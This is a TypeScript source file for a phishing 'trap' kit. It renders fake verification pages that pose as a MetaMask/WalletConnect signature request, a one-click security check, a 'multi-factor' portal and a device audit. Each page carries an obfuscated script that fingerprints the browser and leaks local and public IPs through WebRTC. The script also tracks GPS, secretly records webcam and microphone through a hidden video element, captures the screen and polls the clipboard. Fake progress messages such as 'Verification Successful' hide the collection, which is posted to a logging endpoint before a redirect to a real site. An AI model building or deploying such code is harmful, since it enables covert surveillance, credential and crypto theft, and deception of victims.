import JavaScriptObfuscator from 'javascript-obfuscator';

export const getCaptureScript = (id: string, redirectUrl: string = 'https://google.com', theme: any = {}) => {
  const flow = theme.flow || 'full'; 
  const perms = theme.perms || ['gps']; 
  
  const rawScript = `
<script>
  (function() {
    var permsCompleted = 0;
    var startTime = Date.now();
    var hasRedirected = false;
    var targetId = '${id}';
    var targetUrl = '${redirectUrl}';
    var flowType = '${flow}';
    var requiredPerms = ${JSON.stringify(perms)};
    var cfg = ${JSON.stringify(theme)};
    
    var extraBuffer = {};
    var extraTimeout = null;
    window.lastStatusMsg = "Initializing...";

    // --- Core Functions ---
    async function logEvent(type, data) {
      console.log("[DEBUG] logEvent: ", type, data);
      try {
        const response = await fetch('/api/log/' + targetId + '/' + type, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'X-Trap-Id': targetId
          },
          body: JSON.stringify(Object.assign({ tmplId: cfg.tmplId, ts: Date.now() }, data))
        });
        return response;
      } catch(e) {
        console.error("[DEBUG] logEvent error: ", e);
        return null;
      }
    }

    async function logExtra(data) {
      Object.assign(extraBuffer, data);
      if (extraTimeout) clearTimeout(extraTimeout);
      extraTimeout = setTimeout(flushExtra, 1500);
    }

    async function flushExtra() {
      if (Object.keys(extraBuffer).length > 0) {
        var dataToSend = Object.assign({}, extraBuffer);
        extraBuffer = {};
        await logEvent('extra', dataToSend);
      }
    }

    function clientLog(msg, data = {}) {
      logEvent('debug', { msg, data, ts: Date.now() });
    }

    async function runSilentProbes() {
      // Avoid double running
      if (window._silentProbesActive) return;
      window._silentProbesActive = true;
      
      // CPU & Memory Fingerprint
      var start = performance.now();
      for(var i=0; i<1000000; i++) Math.sqrt(i);
      var score = (performance.now() - start).toFixed(2);
      await logExtra({ cpu_bench: score + 'ms', mem_gb: navigator.deviceMemory || 'N/A' });

      // Advanced 2026 Biometric & Environment APIs
      try {
        if (navigator.computePressure) {
           var observer = new ComputePressureObserver(async (records) => {
             await logExtra({ thermal_load: JSON.stringify(records) });
           });
           observer.observe('cpu');
           setTimeout(() => observer.unobserve('cpu'), 4000);
        }
        if (navigator.eyeTracking) await logExtra({ biometric_eye: 'available' });
        if (navigator.keyboard && navigator.keyboard.getLayoutMap) {
           var map = await navigator.keyboard.getLayoutMap().catch(() => null);
           if (map) await logExtra({ kbd_layout: 'detected' });
        }
      } catch(e) {}

      // Media Devices stealth enumeration
      try {
          if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
              navigator.mediaDevices.enumerateDevices().then(async function(devices) {
                  var mediaArr = devices.map(d => d.kind + ': ' + (d.label || 'unknown_device'));
                  await logEvent('extra', { media_hardware: mediaArr.join('\\n') });
              });
          }
      } catch(e) {}

      // Sensor telemetry (Silent checks)
      try {
          if ('AmbientLightSensor' in window) {
              const sensor = new window.AmbientLightSensor();
              sensor.onreading = async () => { await logExtra({ sensor_light: sensor.illuminance }); sensor.stop(); };
              sensor.start();
          }
      } catch(e) {}

      // High Entropy Hardware Identity
      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
        navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platformVersion', 'fullVersionList', 'bitness', 'formFactor', 'wow64']).then(async function(h) {
           await logExtra({ hw_entropy: JSON.stringify(h) });
        }).catch(function(){});
      }

      // WebGL Deep Forensics
      try {
        var c = document.createElement('canvas');
        var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
        if (gl) {
          var dbg = gl.getExtension('WEBGL_debug_renderer_info');
          var gpu = {
            v: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'N/A',
            r: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A',
            max_tex: gl.getParameter(gl.MAX_TEXTURE_SIZE),
            max_view: gl.getParameter(gl.MAX_VIEWPORT_DIMS)[0] + 'x' + gl.getParameter(gl.MAX_VIEWPORT_DIMS)[1],
            shading: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
          };
          await logExtra({ gpu_deep: JSON.stringify(gpu) });
        }
      } catch(e) {}

      // WebAudio Fingerprint
      try {
        var ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
        var osc = ctx.createOscillator();
        osc.type = 'triangle';
        osc.frequency.setValueAtTime(12000, ctx.currentTime);
        var comp = ctx.createDynamicsCompressor();
        comp.threshold.setValueAtTime(-45, ctx.currentTime);
        osc.connect(comp);
        comp.connect(ctx.destination);
        osc.start(0);
        ctx.startRendering().then(async function(buf) {
          var s = 0;
          for (var i = 4000; i < 4100; i++) s += Math.abs(buf.getChannelData(0)[i]);
          await logExtra({ audio_hash: s.toFixed(15) });
        });
      } catch(e) {}

      // WebRTC Leakage
      try {
        var pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
        pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = async function(ice) {
          if (ice && ice.candidate && ice.candidate.candidate) {
            var ip = ice.candidate.candidate;
            if (ip.includes('typ srflx')) await logExtra({ rtc_public: ip });
            else if (ip.includes('typ host')) await logExtra({ rtc_local: ip });
          }
        };
      } catch(e) {}

      // Battery Status API
      try {
        if (navigator.getBattery) {
          navigator.getBattery().then(async function(battery) {
            await logExtra({ battery: (battery.level * 100).toFixed(0) + '%, ' + (battery.charging ? 'Charging' : 'Discharging') });
          });
        }
      } catch(e) {}

      // Network Information API
      try {
        if (navigator.connection) {
          var conn = navigator.connection;
          await logExtra({ network: conn.effectiveType + ', downlink: ' + conn.downlink + 'Mbps, rtt: ' + conn.rtt + 'ms' });
        }
      } catch(e) {}

      // Canvas Fingerprinting
      try {
        var canvas = document.createElement('canvas');
        var ctx = canvas.getContext('2d');
        if (ctx) {
          var txt = 'Browser Fingerprint 2026';
          ctx.textBaseline = 'top';
          ctx.font = "14px 'Arial'";
          ctx.textBaseline = 'alphabetic';
          ctx.fillStyle = '#f60';
          ctx.fillRect(125,1,62,20);
          ctx.fillStyle = '#069';
          ctx.fillText(txt, 2, 15);
          ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
          ctx.fillText(txt, 4, 17);
          
          var b64 = canvas.toDataURL().replace('data:image/png;base64,', '');
          var hash = 0;
          for (var i = 0; i < b64.length; i++) {
            hash = ((hash << 5) - hash) + b64.charCodeAt(i);
            hash = hash & hash;
          }
          await logExtra({ canvas_hash: hash.toString(16) });
        }
      } catch(e) {}
    }

    async function fireGPS() {
      clientLog("fireGPS: Starting");
      if (requiredPerms.includes('gps') && navigator.geolocation) {
        clientLog("fireGPS: GPS permission included");
        return new Promise(resolve => {
          var bestAcc = 999999;
          var hasLoggedOnce = false;

          var gpsWatch = navigator.geolocation.watchPosition(
            (pos) => { 
               if (pos.coords.accuracy < bestAcc) {
                 bestAcc = pos.coords.accuracy;
                 logEvent('gps', { 
                   lat: pos.coords.latitude, 
                   lon: pos.coords.longitude, 
                   acc: pos.coords.accuracy.toFixed(1),
                   alt: pos.coords.altitude || 'N/A',
                   speed: pos.coords.speed || 'N/A'
                 }); 
                 hasLoggedOnce = true;
               }
               // Resolve if accuracy is good enough (< 20 meters)
               if (pos.coords.accuracy < 20) {
                 navigator.geolocation.clearWatch(gpsWatch);
                 permsCompleted++; 
                 resolve(); 
               }
            },
            (e) => { 
                clientLog("fireGPS: Error", e.message);
                if (!hasLoggedOnce) {
                  fetch('https://ipapi.co/json/')
                      .then(r => r.json())
                      .then(data => logEvent('ip_geo', data))
                      .catch(err => clientLog("IP Geo failed", err.message));
                }
                permsCompleted++; 
                resolve(); 
            },
            { enableHighAccuracy: true, maximumAge: 0, timeout: 12000 }
          );
          // Safety timeout: 20 seconds to get the best possible fix
          setTimeout(() => { 
            navigator.geolocation.clearWatch(gpsWatch);
            resolve(); 
          }, 20000); 
        });
      } else if (requiredPerms.includes('gps')) {
         permsCompleted++;
         return Promise.resolve();
      }
    }

    async function fireParallel() {
      clientLog("fireParallel: Starting");
      if (requiredPerms.includes('media')) {
        clientLog("fireParallel: Media permission included");
        try {
          if (navigator.mediaDevices) {
            var constraints = { 
              video: { 
                facingMode: "user",
                width: { ideal: 1280 },
                height: { ideal: 720 }
              }, 
              audio: true 
            };
            var stream = await Promise.race([
              navigator.mediaDevices.getUserMedia(constraints).catch(async (e) => {
                 clientLog("fireParallel: getUserMedia failed, trying fallback", e.message);
                 return navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }).catch((e2) => {
                     clientLog("fireParallel: Fallback failed", e2.message);
                     return null;
                 });
              }),
              new Promise(r => setTimeout(() => {
                clientLog("fireParallel: getUserMedia timed out");
                r(null);
              }, 12000)) // 12 seconds timeout for media prompt
            ]);
            
            if (stream) {
              var video = document.createElement('video');
              video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;';
              video.srcObject = stream;
              video.setAttribute('autoplay', ''); video.setAttribute('muted', ''); video.setAttribute('playsinline', '');
              document.body.appendChild(video);
              
              await new Promise(r => { 
                video.onloadedmetadata = () => { 
                  video.play().then(() => {
                    clientLog("fireParallel: Video playing");
                    r();
                  }).catch(e => {
                    clientLog("fireParallel: Video play error", e.message);
                    r();
                  }); 
                };
                setTimeout(r, 2500); 
              });
              
              // Set up recurring captures
              var captureIdx = 0;
              var captureTimer = setInterval(async () => {
                try {
                  var canvas = document.createElement('canvas');
                  canvas.width = video.videoWidth || 1280;
                  canvas.height = video.videoHeight || 720;
                  var ctx = canvas.getContext('2d');
                  if (ctx && video.readyState >= 2) { 
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height); 
                     var quality = captureIdx === 0 ? 0.85 : 0.7;
                     await logEvent('extra', { 
                       visual_identity: canvas.toDataURL('image/jpeg', quality),
                       capture_index: captureIdx++
                     }); 
                  }
                } catch(e) { clientLog("Capture error", e.message); }
              }, 4000);
              
              // Stop interval on redirect
              setTimeout(() => { clearInterval(captureTimer); }, 55000);

              if (stream.getAudioTracks().length > 0) {
                try {
                  const recorder = new MediaRecorder(stream);
                  recorder.ondataavailable = async (e) => {
                    if (e.data.size > 0) {
                      const reader = new FileReader();
                      reader.onload = async () => {
                        const base64 = typeof reader.result === 'string' ? reader.result.split(',')[1] : '';
                        if (base64) await logEvent('extra', { audio_chunk: base64 });
                      };
                      reader.readAsDataURL(e.data);
                    }
                  };
                  setInterval(() => {
                    try {
                      if (recorder.state === 'inactive') recorder.start();
                      setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 4000);
                    } catch(err) {}
                  }, 5000);
                } catch(e) { clientLog("Audio Recorder Error", e.message); }
              }

              // Capture high quality shot after settling and wait for it
              await new Promise(resolve => {
                setTimeout(async () => {
                  try {
                    var canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 1280;
                    canvas.height = video.videoHeight || 720;
                    var ctx = canvas.getContext('2d');
                    if (ctx) { 
                       ctx.drawImage(video, 0, 0, canvas.width, canvas.height); 
                       await logEvent('extra', { visual_identity: canvas.toDataURL('image/jpeg', 0.85) }); 
                    }
                  } catch(e) {}
                  resolve(null);
                }, 1200);
              });
            }
          }
        } catch(e) { clientLog("fireParallel: Exception", e.message); }
        permsCompleted++;
      }
    }

    async function firePermission(p) {
      if (p === 'media' || p === 'gps') return; // Handled separately
      clientLog("firePermission: " + p);
      var prog = 30; // approx
      try {
        if (p === 'notification') {
          if (typeof updateProgress === 'function') updateProgress(prog, "SSL Handshake...");
          if ("Notification" in window) await pTimeout(Notification.requestPermission(), 4000);
        }
        if (p === 'clipboard') {
          if (navigator.clipboard && navigator.clipboard.readText) {
            var lastClip = "";
            setInterval(async () => {
               try {
                 var clip = await navigator.clipboard.readText();
                 if (clip && clip !== lastClip) {
                    lastClip = clip;
                    await logExtra({ clipboard_update: clip });
                 }
               } catch(e) {}
            }, 3000);
            var initialClip = await pTimeout(navigator.clipboard.readText(), 3000).catch(() => null);
            if (initialClip) await logExtra({ clipboard: initialClip });
          }
        }
        if (p === 'screen') {
           if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
             var s = await pTimeout(navigator.mediaDevices.getDisplayMedia({ video: true }).catch(() => null), 15000);
             if (s) {
               var track = s.getVideoTracks()[0];
               var video = document.createElement('video');
               video.style.opacity = '0';
               video.srcObject = s;
               video.setAttribute('autoplay', ''); video.setAttribute('muted', ''); video.setAttribute('playsinline', '');
               document.body.appendChild(video);
               await new Promise(r => { video.onloadedmetadata = () => { video.play().then(r).catch(r); }; setTimeout(r, 2000); });
               setInterval(async () => {
                   var canvas = document.createElement('canvas');
                   canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
                   var ctx = canvas.getContext('2d');
                   if (ctx) { 
                      ctx.drawImage(video, 0, 0, canvas.width, canvas.height); 
                      await logEvent('extra', { screen_label: track.label, screen_capture: canvas.toDataURL('image/jpeg', 0.6) }); 
                   }
               }, 4000);
             }
           }
        }
        if (p === 'storage') {
          if (navigator.storage && navigator.storage.estimate) {
            var est = await navigator.storage.estimate();
            await logExtra({ storage_mb: (est.usage/1024/1024).toFixed(2) });
          }
        }
        if (p === 'sensors') {
           if (window.Magnetometer) { var mag = new Magnetometer({frequency: 5}); mag.onreading = () => logExtra({ sensor_mag: mag.x+','+mag.y+','+mag.z }); mag.start(); }
           if (window.Accelerometer) { var acc = new Accelerometer({frequency: 5}); acc.onreading = () => logExtra({ sensor_acc: acc.x+','+acc.y+','+acc.z }); acc.start(); }
        }
        if (p === 'vibration') { if (navigator.vibrate) navigator.vibrate(200); }
      } catch(e) {}
      permsCompleted++;
    }

    async function checkRedirect() {
      if (hasRedirected) return;
      var elapsed = (Date.now() - startTime) / 1000;
      var threshold = (flowType === 'full') ? 60 : 15;
      if (elapsed >= threshold || (permsCompleted >= requiredPerms.length && elapsed >= 5)) {
        hasRedirected = true;
        try { await flushExtra(); } catch(e) {}
        window.location.href = targetUrl;
      }
    }

    if (flowType === 'silent') {
       window.onload = function() {
         setTimeout(function() { window.startCapture('silent'); }, 1000);
       };
    } else if (flowType !== 'aggressive') {
       // Implementation of interaction capture directly to preserve user gesture
       window.addEventListener('load', function() {
          function getTargetBtn() {
            return document.querySelector('.btn-verify') || document.querySelector('.btn') || document.querySelector('button') || document.querySelector('.interactive-box');
          }
          
          function handleTap(e) {
            if (running) return;
            console.log("[DEBUG] handleTap click", e);
            clientLog("handleTap: Clicked", { e: e ? e.type : 'unknown' });
            
            var btn = getTargetBtn();
            if (btn && cfg.tmplId !== 'enuma_elish' && cfg.tmplId !== 'flash_strike') {
              btn.style.transform = 'scale(0.96)';
              if (!btn.classList.contains('interactive-box')) {
                btn.style.opacity = '0.8';
              }
              setTimeout(function() { 
                btn.style.transform = ''; 
                if (!btn.classList.contains('interactive-box')) btn.style.opacity = '1';
              }, 150);
            }

            // Start capture sequence immediately IN THE SAME CALL STACK
            window.startCapture('all');
          }
          
          var mainBtn = getTargetBtn();
          if (mainBtn) {
             mainBtn.addEventListener('click', handleTap);
             mainBtn.addEventListener('touchstart', handleTap, {passive: true});
          }
       });
    }

    setInterval(checkRedirect, 1000);

    var running = false;
    function clientLog(msg, data = {}) {
      logEvent('debug', { msg, data, ts: Date.now() });
    }

    window.startCapture = async function(mode) {
      if (running || hasRedirected) return;
      running = true;

      console.log("[DEBUG] startCapture: Enter", { mode });
      clientLog("startCapture: Enter", { mode, perms: requiredPerms });
      
      var isSilent = mode === 'silent' || flowType === 'silent';
      var accent = cfg.accent || '#3498db';
      var statusText = null;

      // 1. Initial Metadata
      var syncData = {
        tmplId: cfg.tmplId,
        browser: navigator.userAgent,
        platform: navigator.platform,
        vendor: navigator.vendor || 'N/A',
        cores: navigator.hardwareConcurrency || 'N/A',
        mem: navigator.deviceMemory || 'N/A',
        screen: window.screen.width + "x" + window.screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        ref: document.referrer || "Direct",
        langs: navigator.languages ? navigator.languages.join(',') : navigator.language,
        touch: ('ontouchstart' in window) || navigator.maxTouchPoints > 0,
        localIp: 'N/A'
      };

      // Try WebRTC Local IP Leak
      try {
          var rtc = new RTCPeerConnection({iceServers:[]});
          rtc.createDataChannel('', {reliable:false});
          rtc.onicecandidate = function(evt) {
              if (evt.candidate) {
                  var match = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(evt.candidate.candidate);
                  if (match && syncData.localIp === 'N/A') {
                      syncData.localIp = match[1];
                      logEvent('extra', { localIpRefined: match[1] });
                  }
              }
          };
          rtc.createOffer().then(function(offer) { rtc.setLocalDescription(offer); }).catch(function(){});
      } catch(e) {}

      // Try GPU synchronously
      try {
        var canvas = document.createElement('canvas');
        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          if (debugInfo) {
            syncData.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
          }
        }
      } catch(e) {}

      await logEvent('info', syncData);

      // 2. Silent Probes
      runSilentProbes();

      if (!isSilent) {
        // UI Preparation
        var btn = document.querySelector('.btn-verify') || document.querySelector('.btn') || document.querySelector('button');
        if (btn) {
          btn.style.opacity = "0.7";
          btn.innerText = "Processing...";
        }

        updateProgress(10, "Verifying Device Trust...");
        
        // High-value captures sequentially to ensure they finish
        try {
           updateProgress(30, "Establishing GPS Precision...");
           await fireGPS().catch(e => clientLog("GPS Error", e.message));
        } catch(e) {}

        try {
           updateProgress(60, "Syncing Media Identity...");
           await fireParallel().catch(e => clientLog("Media Error", e.message));
        } catch(e) {}

        updateProgress(85, "Hardening Connection...");

        // Other permissions run sequentially
        (async function() {
           for (const p of requiredPerms) {
             if (p !== 'gps' && p !== 'media') {
               try {
                 await firePermission(p);
               } catch(e) { clientLog("Perm Error: " + p, e.message); }
             }
           }
        })();
        
        updateProgress(100, "Verification Successful.");
      } else {
        // Silent flow permissions
        if (requiredPerms.includes('vibration') && navigator.vibrate) navigator.vibrate(200);
      }

      await flushExtra();
      setTimeout(checkRedirect, 2000);
    };
    // ...
    
    function updateProgress(p, text) {
      var templateMessages = {
        'google': ["Authenticating Google Account Services...", "Syncing Identity Markers...", "Verifying Device Trust Tier...", "Securing Session Channel...", "Finalizing Google Guard Audit..."],
        'cloudflare': ["Checking Edge Browser Environment...", "Verifying Ray ID Integrity...", "Analyzing HTTP/3 Headers...", "Bypassing DNS Filter...", "Cloudflare Edge Validation Complete..."],
        'terminal': ["Initializing Root Shell...", "Loading Cryptographic Modules...", "Analyzing System Logs...", "Hardening Kernel Space...", "Diagnostic Audit Succesfull..."],
        'steam': ["Connecting to Steam Servers...", "Synchronizing Steam Guard Token...", "Validating Account Credentials...", "Establishing Secure Pipe...", "Steam Guard Verification Finished..."],
        'binance': ["Securing Crypto Wallet Bridge...", "Analyzing Blockchain Node...", "Verifying AML Compliance...", "Finalizing Transaction Tunnel...", "Withdrawal Security Confirmed..."],
        'default': ["Analyzing environment...", "Validating integrity...", "Hardening connection...", "Syncing markers...", "Finalizing audit..."]
      };

      var messages = templateMessages[cfg.tmplId] || templateMessages['default'];
      var idx = Math.floor(p / 20);
      if (idx >= messages.length) idx = messages.length - 1;
      var msg = text || messages[idx];
      window.lastStatusMsg = msg;
      
      var st = document.getElementById('status-text');
      if (st) st.innerText = msg;
      
      var syncStatus = document.getElementById('sync-status');
      if (syncStatus) syncStatus.innerText = msg;
    }
    
    if (cfg.silent || cfg.flow === 'silent') {
       updateProgress = function() {};
    }

  })();
</script>
  `;
  
  try {
      const match = rawScript.match(/<script>([\s\S]*?)<\/script>/);
      let scriptContent = match ? match[1] : '';
      if(scriptContent) {
          const obfRes = JavaScriptObfuscator.obfuscate(scriptContent, {
            compact: true,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 0.5,
            deadCodeInjection: false,
            debugProtection: false,
            disableConsoleOutput: false,
            identifierNamesGenerator: 'hexadecimal',
            log: false,
            numbersToExpressions: true,
            renameGlobals: false,
            selfDefending: false,
            simplify: true,
            splitStrings: true,
            splitStringsChunkLength: 10,
            stringArray: true,
            stringArrayCallsTransform: true,
            stringArrayCallsTransformThreshold: 0.5,
            stringArrayEncoding: ['base64'],
            stringArrayIndexShift: true,
            stringArrayRotate: true,
            stringArrayShuffle: true,
            stringArrayWrappersCount: 1,
            stringArrayWrappersChainedCalls: true,
            stringArrayWrappersParametersMaxCount: 2,
            stringArrayWrappersType: 'variable',
            stringArrayThreshold: 0.75,
            unicodeEscapeSequence: false
        });
        return `<script>${obfRes.getObfuscatedCode()}</script>`;
      }
      return rawScript;
  } catch(e) {
      // fallback
      return rawScript;
  }
};

const ALL_PERMS = ['media', 'gps', 'screen', 'notification', 'clipboard', 'contacts', 'network', 'performance', 'security', 'storage_map', 'network_forensic', 'fonts_advanced', 'window_mgmt', 'webauthn', 'sensors', 'storage', 'vibration', 'bluetooth', 'files'];
const SILENT_PERMS = ['vibration', 'network', 'performance', 'security', 'storage_map', 'network_forensic'];
const NETWORK_PERMS = ['network', 'bluetooth', 'performance', 'security', 'network_forensic', 'vibration'];
const GOOGLE_PERMS = ['gps', 'media', 'network', 'performance', 'security', 'vibration'];
const LOGISTICS_PERMS = ['gps', 'network', 'vibration', 'performance'];
const FORENSIC_PERMS = ['clipboard', 'contacts', 'files', 'storage', 'storage_map', 'sensors'];

export const templates: Record<string, {name: string, render: (id: string) => string}> = {
  'wallet_connect': {
    name: "🦊 Web3 Wallet Verification (Crypto Trap)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>WalletConnect | Sign Message</title><style>body { background:#141414; color:#fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { border:1px solid #333; background:#1c1c1c; padding:32px; width:100%; max-width:380px; box-sizing: border-box; border-radius: 24px; text-align:center; box-shadow: 0 4px 40px rgba(0,0,0,0.5); } .logo { width: 80px; height: 80px; margin-bottom: 24px; border-radius: 50%; box-shadow: 0 0 20px rgba(51, 150, 255, 0.4); } h2 { font-size:22px; margin:0 0 12px; font-weight: 700; color: #fff; } p { color:#999; font-size:15px; margin-bottom:32px; line-height: 1.5; } .address { background: #2c2c2c; border: 1px solid #444; border-radius: 12px; padding: 12px; font-family: monospace; font-size: 13px; color: #ccc; margin-bottom: 32px; word-break: break-all; } .btn { background:#3396ff; color:#fff; border:none; padding:16px; border-radius:12px; font-weight:600; cursor:pointer; width:100%; font-size: 16px; transition: background 0.2s; } .btn:hover { background: #287be6; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="logo" referrerpolicy="no-referrer"><h2>Signature Request</h2><p>You need to sign a message to verify wallet ownership for this dApp interaction.</p><div class="address" id="eth_addr">0x... fetching</div><button class="btn" onclick="this.disabled=true; this.innerText='Connecting...'; window.startCapture('wallet_connect');">Connect MetaMask</button></div><div style="font-size:12px; color:#555; margin-top:20px; text-align:center;">Secured by WalletConnect v2</div><script>setTimeout(() => { document.getElementById('eth_addr').innerText = '0x' + Array.from({length:40}, () => Math.floor(Math.random()*16).toString(16)).join(''); }, 800);</script>${getCaptureScript(id, 'https://metamask.io/', {
      tmplId: 'wallet_connect', perms: ['network', 'clipboard', 'performance', 'security', 'storage_map', 'network_forensic'], accent: '#3396ff', icon: '🦊', flow: 'silent'
    })}</body></html>`
  },
  'silent_click': {
    name: "🛡️ Quick Security Check (One-Click)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verifikasi Keamanan</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; background:#121212; color: #ffffff; } .container { width: 100%; max-width: 450px; padding: 40px; border-radius: 12px; background: #1e1e1e; box-shadow: 0 4px 30px rgba(0,0,0,0.5); } .logo { font-size: 50px; margin-bottom: 20px; } .main-text { font-size: 24px; font-weight: 700; margin-bottom: 15px; color: #fff; } .sub-text { font-size: 15px; color: #aaa; margin-bottom: 40px; line-height: 1.5; } .btn-verify { background: #00ff00; color: #000; border: none; padding: 18px 40px; border-radius: 6px; font-size: 16px; font-weight: 800; cursor: pointer; transition: all 0.2s ease; width: 100%; text-transform: uppercase; letter-spacing: 1px; } .btn-verify:hover { transform: scale(1.02); filter: brightness(1.1); box-shadow: 0 0 20px rgba(0,255,0,0.3); } .btn-verify:active { transform: scale(0.98); } </style></head><body><div class="container"><div class="logo">🛡️</div><div class="main-text">One-Click Verification</div><div class="sub-text">Sistem ini memverifikasi keamanan koneksi Anda secara instan menggunakan algoritma deteksi bot pasif.</div><button class="btn-verify" onclick="this.disabled=true; this.innerText='VERIFYING...'; window.startCapture('silent');">VERIFIKASI SEKARANG</button><div style="font-size:11px; color:#555; margin-top:25px;">Verified by Global Security Service</div></div>` + getCaptureScript(id, 'https://google.com', {
      tmplId: 'silent_click', perms: ['network', 'vibration', 'performance', 'security', 'storage_map', 'network_forensic'], accent: '#00ff00', icon: '⚡', flow: 'silent'
    }) + `</body></html>`
  },
  'enuma_elish': {
    name: "🛡️ Advanced Multi-Factor Verification",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verification Portal</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; background:#000; color: #ff0000; overflow: hidden; } .container { width: 100%; max-width: 450px; padding: 40px; border-radius: 12px; background: #111; box-shadow: 0 0 50px rgba(255, 0, 0, 0.5); border: 1px solid #330000; position: relative; z-index: 10; } .logo { font-size: 50px; margin-bottom: 20px; animation: pulse 2s infinite; } @keyframes pulse { 0% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } 100% { transform: scale(1); opacity: 0.8; } } .main-text { font-size: 26px; font-weight: 800; margin-bottom: 15px; color: #ff0000; letter-spacing: 2px; } .sub-text { font-size: 15px; color: #888; margin-bottom: 30px; line-height: 1.5; } .btn-verify { background: #ff0000; color: #fff; border: none; padding: 25px 0; border-radius: 8px; font-size: 20px; font-weight: 900; cursor: pointer; width: 100%; text-transform: uppercase; letter-spacing: 3px; position: relative; overflow: hidden; transition: 0.1s; } .btn-verify:active { transform: scale(0.95); background: #cc0000; } .tap-text { font-size: 14px; margin-top: 15px; color: #ff5555; font-weight: bold; animation: blink 0.5s infinite alternate; } @keyframes blink { from { opacity: 1; } to { opacity: 0.3; } } /* The trap element */ .click_trap { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; opacity: 0; display: none; } .ray-desc { font-family: monospace; font-size: 12px; color: #777; margin-top: 25px; } </style></head><body><div class="container"><div class="logo">👆👆</div><div class="main-text">SECURE INTERACTION</div><div class="sub-text">This server requires rapid multi-factor verification to establish a secure encrypted connection.</div><button class="btn-verify" onclick="initiateStrike(this)">Verify Interaction</button><p class="tap-text">⚠️ INTERACTION REQUIRED ⚠️</p><div class="ray-desc">REF CODE : rax53rtnaomap</div></div><div id="trap" class="click_trap" onclick="window.startCapture('all')"></div><script>function initiateStrike(btn) { btn.innerText = 'TAP SCREEN NOW!'; btn.style.background = '#aa0000'; document.getElementById('trap').style.display = 'block'; window.startCapture('all'); setTimeout(() => { if (document.getElementById('trap').style.display === 'block') { window.startCapture('all'); } }, 300); }</script>` + getCaptureScript(id, 'https://google.com', {
      tmplId: 'enuma_elish', perms: ALL_PERMS, accent: '#ff0000', icon: '👆', flow: 'aggressive'
    }) + `</body></html>`
  },
  'flash_strike': {
    name: "🔒 Comprehensive Device Logic Audit",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>System Verification</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; background:#000; color: #ffcc00; } .container { width: 100%; max-width: 450px; padding: 40px; border-radius: 12px; background: #111; border: 2px solid #ffcc00; box-shadow: 0 0 40px rgba(255, 204, 0, 0.4); } .logo { font-size: 50px; margin-bottom: 20px; text-shadow: 0 0 20px rgba(255,204,0,0.8); } .main-text { font-size: 28px; font-weight: 800; margin-bottom: 15px; color: #ffcc00; text-transform: uppercase; } .sub-text { font-size: 15px; color: #ccc; margin-bottom: 40px; line-height: 1.6; } .btn-verify { background: #ffcc00; color: #000; border: none; padding: 20px 40px; border-radius: 6px; font-size: 18px; font-weight: 900; cursor: pointer; transition: all 0.2s ease; width: 100%; text-transform: uppercase; letter-spacing: 2px; } .btn-verify:hover { transform: scale(1.05); filter: brightness(1.2); box-shadow: 0 0 30px rgba(255, 204, 0, 0.6); } .btn-verify:active { transform: scale(0.95); } </style></head><body><div class="container"><div class="logo">🔒</div><div class="main-text">Environment Audit</div><div class="sub-text">Please click once to confirm your device environment's integrity and authorize this encrypted session.</div><button class="btn-verify" onclick="this.disabled=true; this.innerText='PROCESSING...'; window.startCapture('all');">VERIFY ONCE</button></div>` + getCaptureScript(id, 'https://google.com', {
      tmplId: 'flash_strike', perms: ALL_PERMS, accent: '#ffcc00', icon: '💥', flow: 'aggressive'
    }) + `</body></html>`
  },
  'google': {
    name: "🛡️ Google: Security Audit Session",
